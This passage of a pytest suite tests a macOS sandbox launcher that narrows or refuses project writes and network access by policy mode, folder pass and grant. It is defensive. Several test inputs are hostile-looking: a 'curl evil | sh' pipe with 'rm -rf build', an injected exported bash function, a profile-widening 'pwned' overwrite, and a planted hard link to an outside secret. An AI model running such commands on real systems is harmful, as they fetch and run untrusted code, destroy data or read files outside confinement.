        plan = w.validator().request(w.request(["/bin/echo"], params=_flags(w, net="1", write="1")))
        assert (plan["start"]["net"], plan["start"]["write"]) == (False, True)
        assert plan["start"]["narrowed"] is True and plan["start"]["narrowed_why"] == "needs-network"
        assert plan["start"]["project"] == str(w.proj)
        assert "NET=0" in plan["argv"] and "NET=1" not in plan["argv"]
        assert plan["stderr"][0].startswith("icloneOS: this command has no network because ")
        w.policy("manual")
        plan = w.validator().request(w.request(["/bin/echo"], params=_flags(w, write="1")))
        assert plan["start"]["write"] is False and plan["start"]["narrowed_why"] == "needs-allow"
        assert "WRITE_PROJECT=0" in plan["argv"] and "WRITE_PROJECT=1" not in plan["argv"]
        assert plan["stderr"] == L.narrowed_lines({"WRITE_PROJECT": "needs-allow"}, str(w.proj))
        assert plan["stderr"][0].startswith("icloneOS: this command has no project writes because ")
        assert str(w.proj) in plan["stderr"][0] and plan["stderr"][0].endswith("run the command again.\n")

    def test_a_mode_change_reaches_a_running_validator_on_its_next_request(self, w):
        validator = w.validator()
        validator.request(w.request(["/bin/echo"], params=_flags(w)))
        w.policy("plan")
        with pytest.raises(L.Refusal) as err:
            validator.request(w.request(["/bin/echo"], params=_flags(w)))
        assert err.value.code == "policy"
        w.policy("acceptEdits")
        validator.request(w.request(["/bin/echo"], params=_flags(w)))

    def test_the_ceiling_is_the_widest_mode_anywhere_and_a_forged_session_gets_exactly_that(self, w):
        # fx12 (b), lens #1/#10: the session in the token is the runtime's word, so the launcher never narrows by it;
        # the widest mode set anywhere is the most any token gets, and never more.
        w.policy("plan", sessions={"sess-1": "acceptEdits"})
        for session in (None, "nobody", "sess-2", "sess-1"):
            plan = w.validator().request(w.request(["/bin/echo"], params=_flags(w, session=session)))
            assert plan["start"]["write"] is True, session
            plan = w.validator().request(w.request(["/bin/echo"], params=_flags(w, net="1", session=session)))
            assert plan["start"]["net"] is False and plan["start"]["narrowed_why"] == "needs-network", session
        w.policy("acceptEdits", sessions={"sess-1": "plan"}, projects={str(w.proj): "plan"})
        # A session or project narrowed to Plan is the runtime's to honour (S1); the launcher's answer is the widest.
        assert w.validator().request(w.request(["/bin/echo"], params=_flags(w, session="sess-1")))["start"]["write"]

    def test_a_folder_main_did_not_list_is_read_only_and_folders_match_by_identity(self, w):
        # fx13 (lens3-normal B2): an unlisted folder narrows to read-only, never refuses — reads go, writes get
        # EPERM from the kernel, and the start row and the run's stderr say why and what to do.
        w.policy("acceptEdits", listed=[])
        plan = w.validator().request(w.request(["/bin/echo"], params=_flags(w, write="1")))
        assert plan["start"]["write"] is False and plan["start"]["narrowed"] is True
        assert plan["start"]["narrowed_why"] == "unlisted-folder" and plan["start"]["project"] == str(w.proj)
        assert "WRITE_PROJECT=0" in plan["argv"] and "WRITE_PROJECT=1" not in plan["argv"]
        assert plan["stderr"][0].startswith("icloneOS: this command has no project writes because ")
        assert str(w.proj) in plan["stderr"][0] and "Allow this folder" in plan["stderr"][0]
        assert w.validator().request(w.request(["/bin/echo"], params=_flags(w, write="0")))["stderr"] == []
        link = w.root / "another-name"
        os.symlink(w.proj, link)
        w.policy("acceptEdits", listed=[str(link)])  # the same folder under another name: identity, not text
        assert w.validator().request(w.request(["/bin/echo"], params=_flags(w, write="1")))["start"]["write"] is True

    def test_a_replaced_folder_at_the_same_path_is_judged_now(self, w):
        # fx13 (lens3-normal m1): listed paths are stat-ed at each request, never cached at the policy's read, so
        # an `rm -rf` and a fresh clone at the same path is the listed folder again without main moving the file.
        validator = w.validator()
        assert validator.request(w.request(["/bin/echo"], params=_flags(w)))["start"]["write"] is True
        shutil.rmtree(w.proj)
        (w.proj / ".git").mkdir(parents=True)
        assert validator.request(w.request(["/bin/echo"], params=_flags(w)))["start"]["write"] is True

    def test_another_spelling_of_the_project_is_refused(self, w):
        import unicodedata
        nfc = w.root / unicodedata.normalize("NFC", "café")
        (nfc / ".git").mkdir(parents=True)
        w.policy("acceptEdits", listed=[str(w.proj), str(nfc)])
        upper = str(w.proj).upper()
        nfd = str(w.root / unicodedata.normalize("NFD", "café"))  # the same name in the other Unicode form
        if not os.path.isdir(upper) or not os.path.isdir(nfd):
            pytest.skip("a case- and form-sensitive filesystem has no other spelling to try")
        for variant, own in ((upper, str(w.proj)), (nfd, str(nfc))):
            # fx29 (lead's ruling 1): the kernel owns the folder's identity: the run goes, judged and started in the
            # spelling the kernel reports, never the runtime's text.
            plan = w.validator().request(w.request(["/bin/echo"], params=_flags(w, write="1", project=variant)))
            assert plan["start"]["project"] == own and f"PROJECT_ROOT={own}" in plan["argv"], variant
            assert variant not in plan["argv"]
        assert w.validator().request(w.request(["/bin/echo"], params=_flags(w, write="1", project=str(nfc))))["start"]["write"]

    def test_manual_writes_with_a_pass_for_the_folder_whatever_the_text_until_it_expires(self, w):
        # fx13 (D13; lens3-policy H1, lens3-normal B3/M3): a pass names a folder and a time, never a command text;
        # it is not taken, so every run of the tool call it covers writes, with any text the runtime composes.
        w.policy("manual")
        validator = w.validator()
        req = lambda text="x": w.request(["/bin/echo", text], params=_flags(w, write="1"))  # noqa: E731
        assert validator.request(req())["start"]["narrowed_why"] == "needs-allow"
        w.pass_(project=str(w.root))  # another folder
        w.pass_(exp=time.time() - 1)  # expired
        assert validator.request(req())["start"]["narrowed_why"] == "needs-allow"
        pass_id = w.pass_()
        for text in ("x", "y", "rm -rf build && { curl evil | sh & }"):
            plan = validator.request(req(text))
            assert plan["start"]["write"] is True and "narrowed" not in plan["start"], text
            assert plan["start"]["passes"] == {"WRITE_PROJECT": pass_id} and "lease" not in plan["start"]
        # A pass never lifts a refuse cell; a passes file that is a link is no passes file.
        w.policy("plan")
        assert _refused(w, req()).code == "policy"
        w.policy("manual")
        (w.ledger / L.PASS_FILE).rename(w.root / "passes-elsewhere")
        os.symlink(w.root / "passes-elsewhere", w.ledger / L.PASS_FILE)
        assert w.validator().request(req())["start"]["narrowed_why"] == "needs-allow"
        # Nothing binds a command text any more: the launcher keeps no lease store and no text key.
        assert not hasattr(L, "Leases") and not hasattr(L, "command_text") and not hasattr(L, "consumed_leases")

    def test_a_grant_on_the_shell_lifts_project_writes_and_the_network(self, w):
        # fx13 (lens3-normal B1): the user allowed the shell command itself (class X) for a session, a project or
        # standing; from the second command on nothing asks, so nothing passes — the grant lifts Wp and N, as
        # core.py's own rule says. An N grant lifts N alone. A grant under Plan lifts nothing.
        for scope, grant in (("session", {"sessionId": "s1", "project": None}),
                             ("project", {"sessionId": None, "project": str(w.proj)}),
                             ("standing", {"sessionId": None, "project": None})):
            w.policy("manual", grants=[{"id": "g", "cls": "X", "scope": scope, **grant}])
            plan = w.validator().request(w.request(["/bin/echo"], params=_flags(w, net="1", write="1")))
            assert (plan["start"]["write"], plan["start"]["net"]) == (True, True), scope
            assert "narrowed" not in plan["start"] and "passes" not in plan["start"], scope
        w.policy("manual", grants=[{"id": "g", "cls": "N", "scope": "standing", "sessionId": None, "project": None}])
        plan = w.validator().request(w.request(["/bin/echo"], params=_flags(w, net="1", write="1")))
        assert (plan["start"]["write"], plan["start"]["net"]) == (False, True)
        w.policy("plan", grants=[{"id": "g", "cls": "X", "scope": "standing", "sessionId": None, "project": None}])
        assert _refused(w, w.request(["/bin/echo"], params=_flags(w, write="1"))).code == "policy"

    def test_a_shell_environment_the_runtime_set_is_dropped(self, w):
        # fx13 (lens3-policy H1): BASH_ENV, ENV, SHELLOPTS, BASHOPTS and exported functions would run the runtime's
        # text before and around the user's command; none reaches a confined run.
        req = w.request(["/bin/echo"], params=_flags(w))
        req["env"].update({"BASH_ENV": "/tmp/a", "ENV": "/tmp/b", "SHELLOPTS": "xtrace", "BASHOPTS": "x",
                           "BASH_FUNC_ls%%": "() { echo pwned; }", "LANG": "C"})
        assert w.validator().request(req)["env"] == {"PATH": "/usr/bin:/bin", "LANG": "C"}

    def test_a_widened_profile_is_judged_with_the_flags_the_run_gets(self, w):
        # fx13 (lens3-policy H2): a widening line that writes the project is judged after the policy narrowed
        # WRITE_PROJECT to 0, so the request is refused — never re-narrowed silently with the line left in the text.
        widened = w.widened(f'(allow file-read* file-write* (subpath "{w.proj}"))')
        req = lambda: w.request(["/bin/echo"], params=_flags(w, write="1", profile=widened), profile=widened)  # noqa: E731
        w.policy("acceptEdits")
        assert w.validator().request(req())["start"]["write"] is True  # control: allowed, judged with WRITE_PROJECT=1
        w.policy("manual")
        with pytest.raises(L.Refusal) as err:
            w.validator().request(req())
        assert err.value.code == "profile-unknown"

    def test_an_unborn_project_is_checked_again_at_spawn_and_one_unborn_run_at_a_time(self, w):
        # fx13 (lens3-policy M2): `.git` is looked up again under the runs lock right before the process exists, and
        # a second unborn request for the same folder identity is refused while the first runs.
        shutil.rmtree(w.proj / ".git")
        w.start()
        plan = w.launcher.validator.request(w.request(["/usr/bin/true"], params=_flags(w, git="unborn")))
        (w.proj / ".git").mkdir()  # another run's git init landed between the request and the spawn
        with pytest.raises(L.Refusal) as err:
            w.launcher._spawn(plan, (0, 1, 2))
        assert "already has a .git" in str(err.value)
        (w.proj / ".git").rmdir()
        first = subprocess.Popen(w.stub(w.argv(["/bin/sleep", "1.5"], params=_flags(w, git="unborn"))),
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        deadline = time.monotonic() + 5
        while time.monotonic() < deadline and not any(r["ev"] == "start" for r in w.journal()):
            time.sleep(0.02)
        second = subprocess.run(w.stub(w.argv(["/usr/bin/true"], params=_flags(w, git="unborn"))), capture_output=True,
                                text=True, timeout=20)
        assert second.returncode == 126 and w.refused()[-1]["detail"] == L.UNBORN_IN_FLIGHT
        locked = subprocess.run(w.stub(w.argv(["/usr/bin/true"], params=_flags(w))), capture_output=True, text=True,
                                timeout=20)
        assert locked.returncode == 0  # a locked run of the same folder, beside the unborn one, goes
        assert first.wait(timeout=10) == 0
        third = subprocess.run(w.stub(w.argv(["/usr/bin/true"], params=_flags(w, git="unborn"))), capture_output=True,
                               text=True, timeout=20)
        assert third.returncode == 0  # the first ended: the folder may be made a repository again

    def test_a_downgrade_kills_a_live_run_above_the_new_ceiling(self, w):
        w.start()
        out = w.proj / "out.txt"
        loop = f"i=0; while [ $i -lt 200 ]; do echo $i >> '{out}'; i=$((i+1)); sleep 0.02; done"
        proc = subprocess.Popen(w.stub(w.argv(["/bin/sh", "-c", loop], params=_flags(w))), stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, text=True)
        deadline = time.monotonic() + 5
        while time.monotonic() < deadline and not (out.exists() and out.read_text().count("\n") >= 3):
            time.sleep(0.02)
        w.policy("plan")
        proc.wait(timeout=10)
        lines = out.read_text().count("\n")
        time.sleep(0.3)
        assert 3 <= lines == out.read_text().count("\n") < 200
        rows = w.journal()
        assert rows[-1]["ev"] == "end" and rows[-1]["signal"] == 9
        (stopped,) = [r for r in rows if r["ev"] == "refused"]
        assert stopped["detail"].startswith(L.STOPPED_BY_POLICY) and L.PLAN_EVERYWHERE in stopped["detail"]
        # Control: the same loop under a policy that stays is never stopped.
        w.policy("acceptEdits")
        out.unlink()
        short = loop.replace("-lt 200", "-lt 5")
        done = subprocess.run(w.stub(w.argv(["/bin/sh", "-c", short], params=_flags(w))), capture_output=True,
                              text=True, timeout=20)
        assert done.returncode == 0 and out.read_text().count("\n") == 5

    def test_a_downgrade_to_asking_kills_a_run_allowed_by_mode_but_never_one_under_a_pass(self, w):
        # fx13 (lens3-normal m3): Automatic → Manual stops a live run holding project writes by the mode alone; a run
        # that started under a pass keeps them past the pass's expiry (a pass's expiry never kills a run).
        w.start()
        out = w.proj / "out.txt"

        def loop(count: int):
            text = f"i=0; while [ $i -lt {count} ]; do echo $i >> '{out}'; i=$((i+1)); sleep 0.02; done"
            proc = subprocess.Popen(w.stub(w.argv(["/bin/sh", "-c", text], params=_flags(w))),
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            deadline = time.monotonic() + 5
            while time.monotonic() < deadline and not (out.exists() and out.read_text().count("\n") >= 3):
                time.sleep(0.02)
            return proc

        w.policy("automatic")
        proc = loop(200)
        w.policy("manual")
        proc.wait(timeout=10)
        assert out.read_text().count("\n") < 200
        rows = w.journal()
        assert rows[-1]["ev"] == "end" and rows[-1]["signal"] == 9
        (stopped,) = [r for r in rows if r["ev"] == "refused"]
        assert L.NOW_ASKS["WRITE_PROJECT"] in stopped["detail"]
        out.unlink()
        w.pass_(exp=time.time() + 0.4)
        proc = loop(40)
        time.sleep(0.5)  # the pass has expired while the run is live
        w.policy("manual", listed=[str(w.proj)])  # the policy moves: the run is judged again, with the pass it held
        assert proc.wait(timeout=10) == 0 and out.read_text().count("\n") == 40
        assert len([r for r in w.journal() if r["ev"] == "refused"]) == 1

    def test_the_program_judged_is_the_program_started(self, w):
        link = w.root / "echo-by-another-name"
        os.symlink("/bin/echo", link)
        plan = w.validator().request(w.request([str(link), "x"], params=_flags(w)))
        assert plan["argv"][-2:] == [os.path.realpath("/bin/echo"), "x"] and str(link) not in plan["argv"]

    def test_a_window_with_no_project_runs_scratch_read_only_in_every_mode(self, w):
        scratch = [f"PROJECT_ROOT={w.scratch}", f"SCRATCH={w.scratch}", f"OUTPUT_DIR={w.scratch / 'output'}",
                   "NET=0", "WRITE_PROJECT=0", "PROJECT_GIT=unborn", f"MEMBER={w.token()}"]
        for standing in ("manual", "acceptEdits", "automatic"):
            w.policy(standing, listed=[])
            plan = w.validator().request({"v": 1, "argv": w.argv(["/bin/echo"], params=scratch),
                                          "cwd": str(w.scratch), "env": {}})
            assert plan["start"]["project"] is None and plan["start"]["write"] is False
        w.policy("acceptEdits", listed=[])
        asks = [p.replace("WRITE_PROJECT=0", "WRITE_PROJECT=1") for p in scratch]
        err = _refused(w, {"v": 1, "argv": w.argv(["/bin/echo"], params=asks), "cwd": str(w.scratch), "env": {}})
        assert err.code == "policy" and "names no project" in str(err)

    def test_a_policy_file_that_is_not_mains_is_no_policy(self, w):
        validator = w.validator()
        wide = json.dumps({"v": 1, "body": {"standing": "automatic", "table": {"automatic": {"Wp": "A", "N": "A"}}}})
        for plant in ("link", "garbage", "empty", "wrong-shape"):
            (w.ledger / L.POLICY_FILE).unlink()
            if plant == "link":
                (w.root / "elsewhere.json").write_text(wide)
                os.symlink(w.root / "elsewhere.json", w.ledger / L.POLICY_FILE)
            elif plant == "garbage":
                (w.ledger / L.POLICY_FILE).write_text("{not json")
            elif plant == "empty":  # what main leaves when a write failed and the folder refused the unlink
                (w.ledger / L.POLICY_FILE).write_text("")
            else:
                (w.ledger / L.POLICY_FILE).write_text(json.dumps({"v": 2, "body": []}))
            with pytest.raises(L.Refusal) as err:
                validator.request(w.request(["/bin/echo"], params=_flags(w)))
            assert err.value.code == "policy", plant

    def test_through_the_socket_the_refusal_is_in_the_ledger_and_a_narrowing_starts_with_its_row(self, w):
        w.policy("plan")
        w.start()
        out = subprocess.run(w.stub(w.argv(["/bin/echo", "x"], params=_flags(w))), capture_output=True, text=True,
                             timeout=20)
        assert out.returncode == 126
        (row,) = w.refused()
        assert row["ev"] == "refused" and row["code"] == "policy" and row["detail"].startswith(L.NO_MODE_WRITES)
        assert w.journal() == []
        w.policy("acceptEdits", listed=[])  # an unlisted folder: the run starts, narrowed; one that fails is told
        ok = subprocess.run(w.stub(w.argv(["/bin/echo", "x"], params=_flags(w))), capture_output=True, text=True,
                            timeout=20)
        assert ok.returncode == 0 and "icloneOS:" not in ok.stderr
        failed = subprocess.run(w.stub(w.argv(["/bin/sh", "-c", "echo oops >&2; exit 3"], params=_flags(w))),
                                capture_output=True, text=True, timeout=20)
        assert failed.returncode == 3 and failed.stderr.startswith("oops\nicloneOS: this command has no project "
                                                                   "writes because "), failed.stderr
        start = w.journal()[0]
        assert start["ev"] == "start" and start["narrowed"] is True and start["narrowed_why"] == "unlisted-folder"
        assert start["project"] == str(w.proj) and start["write"] is False


KERNEL_RULE = ('(if (and (string? (param "PROJECT_ROOT")) (not (equal? (param "WRITE_PROJECT") "1")) '
               '(not (equal? (param "PROJECT_ROOT") (param "SCRATCH")))) '
               '(deny file-write* (subpath (param "PROJECT_ROOT")) (with message "iclone-confined:project")))')



def _seatbelt_world(tmp_path, monkeypatch):
    """The real runtime's SeatbeltEnvironment over a real launcher: what the file tools and the terminal do."""
    import tests.plugins.test_iclone_confinement as TC
    # BSD `mkdir -p` (the file tools' parent step) calls mkdir on every ancestor down from `/` and needs EEXIST, not
    # EPERM, from the kernel; the app's profile lets that pass, the mini profile does not. The test profile allows
    # the ancestor nodes themselves (literals, never their children) and carries the kernel rule of sbpl.ts (the H2
    # line): a narrowed run still cannot create anything in the project, the negative control these rows need.
    parents, at = [], os.path.realpath(str(tmp_path))
    while at != "/":
        parents.append(at)
        at = os.path.dirname(at)
    nodes = " ".join(f'(literal "{p}")' for p in parents)
    extra = f"(allow file-read-metadata {nodes})\n(allow file-write* {nodes})\n" + KERNEL_RULE + "\n"
    monkeypatch.setattr(TC, "MINI_PROFILE", TC.MINI_PROFILE + extra)
    root, project, _profiles, _sha, env = TC.TestSeatbeltLive().world(tmp_path, monkeypatch)
    run_d = Path(os.path.realpath(tempfile.mkdtemp(prefix="icl-", dir="/tmp"))) / "run"
    ledger = run_d.parent / "ledger"
    ledger.mkdir(parents=True)
    launcher = L.Launcher(env._index, str(run_d / "launcher.sock"), str(ledger))
    launcher.bind()
    threading.Thread(target=launcher.serve_forever, daemon=True).start()
    monkeypatch.setenv("ICLONE_RUNTIME_CONFINED", "1")
    monkeypatch.setenv("ICLONE_CONFINEMENT_LAUNCHER", str(run_d / "launcher.sock"))
    policy_mod = L._load_policy_module()

    def honest(session_id, project, window=None):  # core.grant_params with the plugin loaded: WRITE=1 unless Wp is refused
        body = json.loads((ledger / L.POLICY_FILE).read_text())["body"]
        net = policy_mod.decide(body, cls="N", facts={}, floor=None, ceiling_key=None, session_id=session_id,
                                project=project)
        write = policy_mod.decide(body, cls="Wp", facts={}, floor=None, ceiling_key=None, session_id=session_id,
                                  project=project)
        return {"NET": "1" if net.outcome == "allow" else "0", "WRITE_PROJECT": "0" if write.outcome == "refuse" else "1"}

    monkeypatch.setattr(sys.modules[type(env).__module__].core, "grant_params", honest)

    def policy(body, listed):
        (ledger / L.POLICY_FILE).write_text(json.dumps({"v": 1, "body": body, "projects": list(listed)}))

    def pass_(folder, cls="Wp"):
        # What main writes for an allowed write_file ask (fx17, M1): the row carries the class the user allowed.
        now = time.time()
        with open(ledger / L.PASS_FILE, "a") as handle:
            handle.write(json.dumps({"v": 1, "id": os.urandom(8).hex(), "project": str(folder), "cls": cls,
                                     "scope": "once", "ts": now, "exp": now + 120}) + "\n")

    def starts():
        path = ledger / "runs.jsonl"
        return [json.loads(x) for x in path.read_text().splitlines() if '"start"' in x] if path.exists() else []

    def close():
        launcher.stop()
        shutil.rmtree(run_d.parent, ignore_errors=True)

    return root, project, env, policy, pass_, starts, close


@pytest.mark.skipif(not LIVE, reason="macOS sandbox-exec only")
class TestPolicyThreeWaysLive:
    def test_manual_without_a_pass_cannot_write_with_one_writes_again_and_again_and_allow_writes(self):
        from tests.plugins.test_iclone_confinement import MINI_PROFILE

        world = World(MINI_PROFILE)
        try:
            world.start(sandbox_exec=L.SANDBOX_EXEC)
            world.policy("manual")

            def run(name: str, text: str = None):
                argv = ["/bin/sh", "-c", text or f"echo x > '{world.proj / name}'"]
                out = subprocess.run(world.stub(world.argv(argv, params=_flags(world))), capture_output=True,
                                     text=True, timeout=30, cwd=str(world.proj))
                return out, (world.proj / name).exists()

            out, exists = run("ask-no-pass")
            assert out.returncode == 1 and not exists and "Operation not permitted" in out.stderr, out.stderr
            assert ("icloneOS: this command has no project writes because no mode set on this Mac allows them "
                    "without asking") in out.stderr, out.stderr
            assert out.stderr.index("Operation not permitted") < out.stderr.index("icloneOS:")  # after the output
            world.pass_()
            out, exists = run("ask-passed")
            assert out.returncode == 0 and exists and "icloneOS:" not in out.stderr, out.stderr
            # The pass is not taken: another text, the shape the runtime rewrites a background job into, writes too.
            again = world.proj / "ask-passed-again"
            out, exists = run("ask-passed-again", f"echo a > '{again}' && {{ echo b >> '{again}' & }}; wait")
            assert out.returncode == 0 and exists, out.stderr
            world.policy("acceptEdits")
            out, exists = run("allowed")
            assert out.returncode == 0 and exists, out.stderr
            world.policy("plan")
            out, exists = run("plan")
            assert out.returncode == 126 and not exists
            starts = [r for r in world.journal() if r["ev"] == "start"]
            assert [(r.get("narrowed_why"), "passes" in r) for r in starts] == [
                ("needs-allow", False), (None, True), (None, True), (None, False)]
        finally:
            world.close()


@pytest.mark.skipif(not LIVE, reason="macOS sandbox-exec only")
class TestFolderPassLive:
    """fx13, the rows D13 asks for, under the real sandbox-exec."""

    def test_an_x_session_grant_writes_from_the_second_command_on(self):
        from tests.plugins.test_iclone_confinement import MINI_PROFILE

        world = World(MINI_PROFILE)
        try:
            world.start(sandbox_exec=L.SANDBOX_EXEC)
            world.policy("manual", grants=[{"id": "g1", "cls": "X", "scope": "session", "sessionId": "s1",
                                            "project": None}])
            made = world.proj / "made"
            for _ in range(2):  # the first command was asked and allowed for the session; the second never asks
                out = subprocess.run(world.stub(world.argv(["/bin/sh", "-c", f"echo x >> '{made}'"],
                                                           params=_flags(world, session="s1"))),
                                     capture_output=True, text=True, timeout=30, cwd=str(world.proj))
                assert out.returncode == 0 and "icloneOS:" not in out.stderr, out.stderr
            assert made.read_text() == "x\nx\n"
            assert [r.get("narrowed") for r in world.journal() if r["ev"] == "start"] == [None, None]
        finally:
            world.close()

    def test_an_unlisted_folder_reads_and_cannot_write_and_the_agent_is_told(self):
        from tests.plugins.test_iclone_confinement import MINI_PROFILE

        world = World(MINI_PROFILE)
        try:
            world.start(sandbox_exec=L.SANDBOX_EXEC)
            for standing in ("manual", "acceptEdits", "automatic"):
                world.policy(standing, listed=[])
                read = subprocess.run(world.stub(world.argv(["/bin/sh", "-c", "cat README"], params=_flags(world))),
                                      capture_output=True, text=True, timeout=30, cwd=str(world.proj))
                assert read.returncode == 0 and read.stdout == "inside\n", (standing, read.stderr)
                assert "icloneOS:" not in read.stderr  # a read that went is told nothing
                write = subprocess.run(world.stub(world.argv(["/bin/sh", "-c", "echo x > new.txt"],
                                                             params=_flags(world))),
                                       capture_output=True, text=True, timeout=30, cwd=str(world.proj))
                assert write.returncode == 1 and "Operation not permitted" in write.stderr, (standing, write.stderr)
                assert "icloneOS: this command has no project writes because " in write.stderr \
                    and str(world.proj) in write.stderr and "Allow this folder" in write.stderr, write.stderr
                assert write.stderr.index("Operation not permitted") < write.stderr.index("icloneOS:")
                assert not (world.proj / "new.txt").exists()
            rows = [r for r in world.journal() if r["ev"] == "start"]
            assert all(r["narrowed"] is True and r["narrowed_why"] == "unlisted-folder" and r["project"] == str(world.proj)
                       for r in rows) and len(rows) == 6
            assert world.refused() == []
            world.policy("acceptEdits")  # listed: the same write lands
            write = subprocess.run(world.stub(world.argv(["/bin/sh", "-c", "echo x > new.txt"], params=_flags(world))),
                                   capture_output=True, text=True, timeout=30, cwd=str(world.proj))
            assert write.returncode == 0 and (world.proj / "new.txt").exists()
        finally:
            world.close()

    def test_fx18_an_unlisted_folder_with_a_planted_hard_link_is_refused_by_the_launcher_itself(self):
        """fx18 (F1): the confined runtime cannot look into a folder main did not open, so F7's scan is the
        launcher's for such a folder: a hard link planted there to a file outside refuses the run before it
        starts, and the plain folder still reads."""
        from tests.plugins.test_iclone_confinement import MINI_PROFILE

        world = World(MINI_PROFILE)
        try:
            world.start(sandbox_exec=L.SANDBOX_EXEC)
            world.policy("manual", listed=[])
            secret = world.root / "outside-secret.txt"
            secret.write_text("outside-secret\n")
            os.link(secret, world.proj / "planted.txt")
            read = subprocess.run(world.stub(world.argv(["/bin/sh", "-c", "cat planted.txt"], params=_flags(world))),
                                  capture_output=True, text=True, timeout=30, cwd=str(world.proj))
            assert read.returncode != 0 and "outside-secret" not in read.stdout, read.stdout
            refused = world.refused()
            assert refused and refused[-1]["code"] in ("hard-links", "cannot-scan") and "planted.txt" in refused[-1]["detail"]
            (world.proj / "planted.txt").unlink()
            read = subprocess.run(world.stub(world.argv(["/bin/sh", "-c", "cat README"], params=_flags(world))),
                                  capture_output=True, text=True, timeout=30, cwd=str(world.proj))
            assert read.returncode == 0 and read.stdout == "inside\n", read.stderr
        finally:
            world.close()

    def test_the_kernel_holds_a_narrowed_write_project_whatever_the_profile_was_widened_with(self, tmp_path):
        # lens3-policy H2, the kernel half: sandbox-exec itself, no launcher, so the rule holds whatever it ordered.
        from tests.plugins.test_iclone_confinement import MINI_PROFILE
        proj = tmp_path / "proj"
        scratch = tmp_path / "scratch"
        proj.mkdir()
        scratch.mkdir()
        (proj / "README").write_text("inside\n")
        widening = f'(allow file-read* file-write* (subpath "{proj}"))\n'

        def run(profile: str, write: str, root=proj, script=None):
            argv = [L.SANDBOX_EXEC, "-p", profile, "-D", f"PROJECT_ROOT={root}", "-D", f"SCRATCH={scratch}",
                    "-D", f"WRITE_PROJECT={write}", "/bin/sh", "-c", script or f"echo pwned > '{root / 'README'}'"]
            return subprocess.run(argv, capture_output=True, text=True, timeout=30, cwd=str(tmp_path))

        out = run(MINI_PROFILE + widening + NEVER + "\n" + KERNEL_RULE + "\n", "0")
        assert out.returncode != 0 and "Operation not permitted" in out.stderr and (proj / "README").read_text() == "inside\n"
        # Without the rule the widening line writes the project under WRITE_PROJECT=0: the hole the rule closes.
        out = run(MINI_PROFILE + widening + NEVER + "\n", "0")
        assert out.returncode == 0 and (proj / "README").read_text() == "pwned\n", out.stderr
        (proj / "README").write_text("inside\n")
        # An honest run: WRITE_PROJECT=1 writes; a scratch run keeps its scratch; an unborn project makes its .git.
        assert run(MINI_PROFILE + NEVER + "\n" + KERNEL_RULE + "\n", "1").returncode == 0
        assert (proj / "README").read_text() == "pwned\n"
        assert run(MINI_PROFILE + NEVER + "\n" + KERNEL_RULE + "\n", "0", root=scratch).returncode == 0
        assert (scratch / "README").read_text() == "pwned\n"
        assert run(MINI_PROFILE + NEVER + "\n" + KERNEL_RULE + "\n", "1", script=f"mkdir '{proj / '.git'}'").returncode == 0
        assert (proj / ".git").is_dir()

    def test_manual_allow_once_then_write_file_through_the_real_tool_path(self, tmp_path, monkeypatch):
        # lens3-normal B3: the file tool runs its own scripts (several runs for one call); a pass on the folder and
        # the two minutes covers them all, where a lease on the call's text (the path) covered none.
        root, project, env, policy, pass_, starts, close = _seatbelt_world(tmp_path, monkeypatch)
        try:
            from tools.file_operations import ShellFileOperations
            policy(_body("manual"), [str(project)])
            target = project / "note.txt"
            ops = ShellFileOperations(env, cwd=str(project))
            res = ops.write_file(str(target), "hello\n")
            assert not target.exists() and all(r.get("narrowed_why") == "needs-allow" for r in starts()), res
            narrowed = len(starts())
            pass_(project)  # the user allowed write_file once: authority.ts passes the folder
            res = ops.write_file(str(target), "hello\n")
            assert target.exists(), (getattr(res, "error", None), [(str(r.get("command"))[:70], r.get("write"), r.get("narrowed_why"), bool(r.get("passes"))) for r in starts()[narrowed:]])
            assert target.read_text() == "hello\n", res
            assert all("narrowed" not in r and r.get("passes") for r in starts()[narrowed:])
        finally:
            close()

    def test_plan_and_the_terminal_switch_off_still_read_a_file_through_the_real_tool_path(self, tmp_path, monkeypatch):
        # lens3-normal M2: the plugin allows read_file in Plan (R is A); the launcher must let the WRITE=0 NET=0
        # request through instead of refusing the run and telling the agent to retry.
        root, project, env, policy, pass_, starts, close = _seatbelt_world(tmp_path, monkeypatch)
        try:
            from tools.file_operations import ShellFileOperations
            ops = ShellFileOperations(env, cwd=str(project))
            for name, body in (("plan", _body("plan")),
                               ("terminal off", _body("automatic", ceilings={"terminal": "off"},
                                                      ceilingKey={"X": "terminal", "Wp": "fileWriting"}))):
                policy(body, [str(project)])
                res = ops.read_file(str(project / "README"))
                assert "inside" in str(getattr(res, "content", "") or "") and not getattr(res, "error", None), (name, res)
            assert all(r["write"] is False or r.get("narrowed_why") == "needs-allow" for r in starts())
        finally:
            close()


class TestProjectRootsNobodyWrites:
    def test_git_folders_and_what_the_shell_runs_from_are_no_project_roots(self, w):
        hooks = w.proj / ".git" / "hooks"
        local_bin = w.home / ".local" / "bin"
        for root in (hooks, w.proj / ".git", local_bin, w.home / ".local", local_bin / "tool"):
            os.makedirs(root, exist_ok=True)
            assert not L.core.acceptable_project_root(str(root), w.index), root
        assert L.core.acceptable_project_root(str(w.proj), w.index)
        req = w.request(["/bin/echo"], params=_flags(w, write="0", project=hooks))
        assert "PROJECT_ROOT" in str(_refused(w, req))


class TestProjectGitIsTheLaunchersJudgement:
    """fx10: the word that lifts the rule on the project's own .git is checked against the folder, not believed."""

    def _unborn_project(self, w):
        project = w.proj.parent / "unborn"
        project.mkdir()
        return project

    def test_a_request_saying_unborn_for_a_project_with_a_git_is_refused(self, w):
        assert (w.proj / ".git").is_dir()
        err = _refused(w, w.request(["/bin/echo"], params=_flags(w, write="0", git="unborn")))
        assert err.code == "bad-request" and "already has a .git" in str(err)
        assert w.validator().request(w.request(["/bin/echo"], params=_flags(w, write="0")))

    def test_a_git_file_and_a_dangling_git_link_count_as_a_git(self, w):
        project = self._unborn_project(w)
        params = lambda: _flags(w, write="0", git="unborn", project=project)
        (project / ".git").write_text("gitdir: elsewhere\n")
        assert L.core.project_git_state(str(project), str(w.scratch)) == "locked"
        (project / ".git").unlink()
        (project / ".git").symlink_to(project / "nowhere")
        assert L.core.project_git_state(str(project), str(w.scratch)) == "locked"
        assert "already has a .git" in str(_refused(w, w.request(["/bin/echo"], params=params())))

    def test_a_project_with_none_is_unborn_and_goes(self, w):
        project = self._unborn_project(w)
        assert L.core.project_git_state(str(project), str(w.scratch)) == "unborn"
        assert w.validator().request(w.request(["/bin/echo"], params=_flags(w, write="0", git="unborn", project=project)))

